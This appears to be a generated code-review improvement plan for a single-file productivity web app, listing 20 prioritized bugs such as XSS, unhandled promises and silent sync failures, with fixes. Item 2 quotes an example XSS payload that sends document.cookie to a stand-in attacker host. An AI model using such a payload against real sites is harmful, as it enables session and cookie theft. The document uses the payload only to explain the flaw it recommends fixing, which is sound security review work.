# Givelink / Task OS — Improvement Plan

_Generated: 2026-06-06. Based on static analysis of `index.html` (12,888 lines), `givelink.html` (1,755 lines), `sw.js`, and `supabase-setup.sql`._

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

---

### 1. Unhandled async rejection crashes the morning briefing widget

**What:** `_fetchAIBriefing` is fired as a floating promise with no `.catch()`, and internally calls `callClaude()` without a try/catch. A Claude API timeout or 5xx bubbles into an unhandled rejection — on some browsers this terminates the JS microtask queue for that tick, silently breaking subsequent interactions on the dashboard.

**Where:** `index.html:9659` (call site), `index.html:9661–9710` (function body)

**Why it matters:** Every dashboard load on days where the Claude API is slow or the user's key is rate-limited leaves the briefing widget broken with no feedback. The user sees a blank card and has no idea why.

**Effort:** S

**Suggested fix:**
- Change the call site at line 9659 from `_fetchAIBriefing(ctx,el,cacheKey);` to `_fetchAIBriefing(ctx,el,cacheKey).catch(e=>console.warn('briefing',e));`
- Wrap the body of `_fetchAIBriefing` in a single `try/catch` that falls back to hiding the AI section gracefully rather than leaving a blank state.

---

### 2. XSS in delete-task toast — task titles execute as HTML

**What:** The delete confirmation toast at line 3128 interpolates `t.title.slice(0,30)` directly into an HTML string without escaping. A task named `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` executes when the toast appears.

**Where:** `index.html:3128`

```js
// VULNERABLE:
toast(`🗑 "<strong>${t.title.slice(0,30)}</strong>" deleted — ...`, 4500);
```

**Why it matters:** Task titles are user-controlled. Although this is a personal app today, if shared or converted to multi-user, any stored task name becomes a stored XSS payload. The `esc()` utility already exists in the codebase; it just isn't being used here.

**Effort:** S

**Suggested fix:**
- Change to `esc(t.title.slice(0,30))` at line 3128.
- Audit the other 4 toast call sites that pass data-derived strings: lines 2675 (`fd(dueDate)`), 3175 (task name in lucky toast), 3178 (people names), 2259 (`label` in `softDelete`). Apply `esc()` to each user-data fragment.

---

### 3. XSS in morning briefing — unescaped task titles in innerHTML

**What:** The pre-Claude static briefing at lines 9645–9651 builds an HTML string from live task titles (`ctx.top3[0].title`, `ctx.overduePeople[n].name`) and assigns it to `briefing-body.innerHTML` without escaping. The AI-rendered briefing at line ~9700 also assigns `d.PRIORITY_1` (Claude output) as raw HTML.

**Where:** `index.html:9645–9651`, `index.html:~9700` (`body.innerHTML=lines.join(...)`)

**Why it matters:** A task title or person name containing `<strong>` or a script tag injects HTML into the dashboard on every page load. Claude's output is also unvalidated — a compromised API key or MITM could inject arbitrary DOM.

**Effort:** S

**Suggested fix:**
- Escape dynamic values: `esc(ctx.top3[0].title)`, `esc(p.name)`, `esc(d.PRIORITY_1)` before including in HTML strings.
- For the Claude output section (`d.PRIORITIES`, `d.RELATIONSHIP`, `d.WARNING`), consider using `textContent` on individual child elements rather than `innerHTML` for the entire block.

---

### 4. Supabase sync flagged as untested — silent auth failure in production

**What:** Commit `67de902` explicitly states the Supabase integration "couldn't be tested against a live project." The `_sbAuth` auto-sign-up fallback (line 8576) will fail silently if "Allow new users to sign up" is disabled in the Supabase dashboard — `_sbSetStatus` sets an error string, but that string is only visible inside the Settings panel, not on the main UI.

**Where:** `index.html:8545–8590` (`_sbAuth`, `sbConnect`), commit `67de902`

**Why it matters:** A user who sets up cloud sync and sees no error assumes their data is being backed up. If auth silently fails, every subsequent save is localStorage-only with no cloud backup. Data loss on device wipe.

**Effort:** M

**Suggested fix:**
- Test end-to-end against a real Supabase project before relying on sync.
- When `sbConnect` fails, show a toast (not just the settings status line) explaining the exact error and a link to Supabase docs for enabling email auth.
- Add a visible "Cloud sync: ⚠ not connected" indicator on the dashboard (reuse the offline-pill slot at line 524) so the failure is impossible to miss.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

---

### 5. Sync errors are invisible during normal app use

**What:** `_sbSetStatus()` writes to `#sb-status` which lives inside the Settings panel. A user who never opens Settings has no way to know that sync has been failing for days.

**Where:** `index.html:8620, 8623, 8625` (status-write call sites), `index.html:1582` (settings UI)

**Why it matters:** Cloud sync is the main data safety net. Silent failures mean users discover data loss only after a device wipe or browser reset.

**Effort:** S

**Suggested fix:**
- On sync error (line 8625 catch block), call `toast('☁️ Cloud sync failed — check Settings', 5000)` once per session (use a flag to avoid spam).
- Optionally show a persistent banner chip near the header when sync is in error state, cleared when the next sync succeeds.

---

### 6. 38 hardcoded `#a78bfa` values break light mode

**What:** The app uses CSS variables for the vast majority of theming, but `#a78bfa` (the Tailwind `violet-400` purple) is hardcoded inline 38 times. In `body.light` mode, these don't update — they remain dark-mode violet on a white background, causing low contrast failures.

**Where:** `index.html` — run `grep -n "#a78bfa"` to get all 38 locations. Key examples: line 533 (Givelink nav link), line 3531 (focus day plan), line 4651 (deep work stat).

**Why it matters:** Every hardcoded colour is a light-mode bug and a brand inconsistency. The CSS variable `--brand2` is already defined as `#bc8cff` (dark) / `#7c3aed` (light) — these values just need to use it.

**Effort:** S

**Suggested fix:**
- Global find-and-replace: `#a78bfa` → `var(--brand2)` everywhere in inline styles.
- Similarly replace `rgba(167,139,250,.X)` with `rgba(var(--brand2-rgb),.X)` or define a `--brand2-soft` variable in `:root`.

---

### 7. Givelink dashboard shows zeroed metrics — no onboarding path

**What:** `renderGivelinkDash()` at line 7440 renders metric cards ("0 nonprofits", "$0 ARR", "$0 MRR") when all values are zero. A first-time user sees what looks like a broken dashboard with no CTA to enter data.

**Where:** `index.html:7441–7550`

**Why it matters:** The Givelink OS is the centrepiece of the startup-tracking flow. A cold empty state with zeroed KPIs signals the feature is broken, not empty. If you're demoing this to investors or co-founders, this is the first thing they see.

**Effort:** S

**Suggested fix:**
- Check `if(!hasData)` at the top of `renderGivelinkDash()` and render an onboarding card: "Set your first Givelink metrics →" with a pre-filled form pointing to the metrics inputs.
- Keep the Pace Engine section hidden until at least one metric has history (`S.givelinkHistory.length > 1`).

---

### 8. AI prompts are hardcoded to "Panos / Givelink" — not multi-user safe

**What:** Six AI prompt templates reference "Panos, founder of Givelink" by name (lines 9664, 4433, 4449, 4637, and in the Givelink outreach workflow). If the app is ever shared, forked, or opened by someone else, the AI responds as if they are Panos.

**Where:** `index.html:9664, 4433, 4449, 4637`

**Why it matters:** Immediate confusion for any user who isn't Panos. Also blocks open-sourcing or sharing the template with others in the Givelink team.

**Effort:** S

**Suggested fix:**
- Store a `profileName` in the state object `S` (default `'Panos'` to avoid breaking existing users).
- Replace literal `"Panos"` references in prompts with `S.profileName||'the user'`.
- For Givelink-specific context, gate it: only inject `givelinkMetrics` context if `S.givelinkMetrics?.nonprofits > 0`.

---

### 9. Post-sync `refresh()` failure leaves UI on stale data silently

**What:** After a successful Supabase pull (line 8613–8620), `refresh()` is called inside `try{refresh();}catch(e){}`. If `refresh()` throws (a render error in any view), the state has been updated in `S` but the DOM still shows old data. The empty catch means this is completely silent.

**Where:** `index.html:8619`

**Why it matters:** Data mismatch between what's stored and what's displayed. The user sees old tasks/metrics but the actual data was overwritten by the remote pull.

**Effort:** S

**Suggested fix:**
- Replace the empty catch with `catch(e){ console.error('Post-sync refresh failed:', e); toast('⚠️ Display refresh failed — reload the page'); }`.
- Alternatively, call `renderView(currentView)` as a more targeted fallback instead of the global `refresh()`.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

---

### 10. 12,888-line monolithic HTML file — zero testability

**What:** The entire app — CSS, HTML templates, and ~8,000 lines of JavaScript — lives in one file. There is no module boundary, no way to run unit tests, no linter, and every diff in GitHub is unreadable.

**Where:** `index.html` entirely

**Why it matters:** Adding a feature requires scrolling through 12K lines. A typo in one render function can break an unrelated view. The commit history shows every PR touches `index.html` — churn rate is 100% on a single file, which means merge conflicts are inevitable as the codebase grows.

**Effort:** L

**Suggested fix:**
- Short-term (no build system required): extract JS into `app.js` and CSS into `app.css`, referenced via `<script src>` / `<link href>`. The browser behaviour is identical but the files are navigable and diffable.
- Medium-term: introduce a minimal build step (`esbuild` or `vite`) that bundles modules, enabling `import/export`, tree-shaking, and test runners like `vitest`.
- Do not rewrite — do this incrementally, one extraction at a time.

---

### 11. `S` state object has no schema migration — old data can break features

**What:** The `S` object at line 2036 defines 60+ fields. Code added in recent commits (like `givelinkHistory`, `treasureChests`, `impossiblePeople`) is accessed with optional chaining (`S.givelinkMetrics?.nonprofits`) but not all new fields get this treatment. An older localStorage state missing a key will throw when code does `S.newField.push(...)`.

**Where:** `index.html:2036` (schema definition), `index.html:2083–2100` (load function)

**Why it matters:** New features silently break for existing users whose stored state pre-dates a field addition. The `seededV2`/`seededGoalsV3` flags handle content seeding but not schema shape.

**Effort:** M

**Suggested fix:**
- Write a `migrateState(raw)` function called from `load()` that deep-merges `raw` with the default `S` object, ensuring all keys exist with correct types.
- Example: `return {...defaultS, ...raw}` handles most cases; add explicit migrations for fields that changed shape (e.g., from scalar to array).

---

### 12. `renderDash()` is 160 lines and does 8 different jobs

**What:** The main dashboard render function (lines 2457–2618) handles stats, widget order, relationship nudges, Givelink today, the AI briefing, habit widgets, the calendar glance, and quest display — all in a single function body.

**Where:** `index.html:2457–2618`

**Why it matters:** Any regression in one widget requires reading through the entire function. The function is already partially broken into sub-renders (`_renderGivelinkToday`, `_renderLifeScoreWidget`) — it just needs to be completed.

**Effort:** M

**Suggested fix:**
- Extract each widget into its own named function (`_renderRelNudge`, `_renderQuestWidget`, `_renderCalendarGlance`) with the same pattern already used by `_renderGivelinkToday`.
- `renderDash()` becomes an orchestrator that calls 8 named functions — easy to skip, test, or reorder.

---

### 13. `givelink.html` has 8 silent empty catch blocks

**What:** The companion Givelink Sprint Board (`givelink.html`) has 8 bare `}catch(e){}` blocks (lines 1083, 1150, 1157, 1209, 1214, and 3 more). These swallow localStorage parse errors, API key read failures, and render errors.

**Where:** `givelink.html:1083, 1150, 1157, 1209, 1214`

**Why it matters:** When something breaks in the Givelink board (which is newer and less battle-tested), there is zero diagnostic output. Debugging requires adding console.logs from scratch.

**Effort:** S

**Suggested fix:**
- Replace all 8 empty catches with `catch(e){ console.warn('[givelink]', e); }` as a baseline.
- For catches that wrap data-write operations, add a visible error state so the user knows the save failed.

---

### 14. No global `unhandledrejection` handler — async failures disappear

**What:** The app fires 6+ async operations (Claude API, Supabase sync, Readwise, Notion, ntfy.sh, morning briefing). When any of these produces an unhandled rejection, there is no listener to catch it — the error is silently logged to the browser DevTools console and invisible to the user.

**Where:** `index.html` init section (~line 8670)

**Why it matters:** Users report "nothing happened" when they click AI buttons on slow connections. The root cause is an unhandled rejection, but without a global handler there is no way to surface it.

**Effort:** S

**Suggested fix:**
```js
window.addEventListener('unhandledrejection', e => {
  console.error('Unhandled async error:', e.reason);
  if(e.reason?.name !== 'AbortError') // ignore intentional cancels
    toast('⚠️ A background operation failed — check connection', 4000);
});
```

---

## 💡 P3 — Nice to have

---

### 15. Colour-only momentum dots fail WCAG 1.4.1

**What:** Goal and task momentum indicators (lines 2859, 2862) communicate status using only a coloured dot (🟢/🟡/🔴) with no text label accessible to screen readers.

**Where:** `index.html:2859, 2862`

**Effort:** S

**Suggested fix:**
- Add a visually hidden `<span class="sr-only">` with the status label ("On track", "At risk", "Stalled") inside each indicator span.
- Define `.sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0,0,0,0); }`.

---

### 16. Service worker registration has no `.catch()` — PWA install failures are silent

**What:** `navigator.serviceWorker.register('./sw.js').then(...)` at line 8675 has no `.catch()`. If SW registration fails (non-HTTPS, browser restriction, scope mismatch), the error is swallowed.

**Where:** `index.html:8675`

**Effort:** S

**Suggested fix:**
- Add `.catch(err => console.warn('SW registration failed:', err))` — no user-visible change needed; just preserves the diagnostic.

---

### 17. SW `statechange` listener leaks on repeated updates

**What:** The `updatefound` handler at line 8677 adds a new `statechange` listener every time an update is found. On a fast connection where multiple SW update cycles occur, `showUpdateBanner()` could fire multiple times.

**Where:** `index.html:8677–8683`

**Effort:** S

**Suggested fix:**
- Add `{ once: true }` to the `statechange` `addEventListener` call.

---

### 18. Hardcoded seed tasks expose founder-specific roadmap to all users

**What:** Lines 3670–3845 contain 40+ hardcoded seed tasks including items like "Film AWG check", "Greek Nonprofits Board (Make-A-Wish etc)", and "Find how to use OpenClaw" — specific to the founder's Givelink roadmap. These are seeded for every new user.

**Where:** `index.html:3670–3845`

**Effort:** M

**Suggested fix:**
- Extract seed data to a clearly marked config block at the top of the script.
- Tag seed tasks with `_isTemplate: true` and add a one-click "Clear template tasks" button to the onboarding flow so new users can start fresh without manually deleting 40 tasks.

---

### 19. No cloud-backup failure indicator on the main dashboard

**What:** The `#offline-pill` (line 524) shows only when `navigator.onLine` is false. Supabase sync can fail for other reasons (expired token, API down, quota exceeded) while the browser shows as "online". There is no persistent badge to warn the user their cloud backup is broken.

**Where:** `index.html:524, 8625`

**Effort:** S

**Suggested fix:**
- When `_sbSetStatus` is called with an error string, also set a `data-sync-error` attribute on the body element.
- Add a CSS rule: `body[data-sync-error] #offline-pill { display: block; background: var(--bw); content: '☁️ Sync error'; }` — reuse the pill slot rather than adding new DOM.

---

### 20. `Notification.requestPermission()` called without `.catch()` in two places

**What:** Lines 9347 and 9385 call `Notification.requestPermission().then(...)` without a `.catch()`. On browsers where the Permissions API is restricted (e.g., Firefox in private mode), this rejects and produces an unhandled rejection.

**Where:** `index.html:9347, 9385`

**Effort:** S

**Suggested fix:**
- Add `.catch(()=>{})` (or a user-friendly fallback message) to both call sites.

---

_Total: 20 items across 4 tiers. P0 items are fixable in a single sitting; P1 items are each under 2 hours. P2 items require planning but no rewrites. Tackle P0 before shipping sync to any additional users._
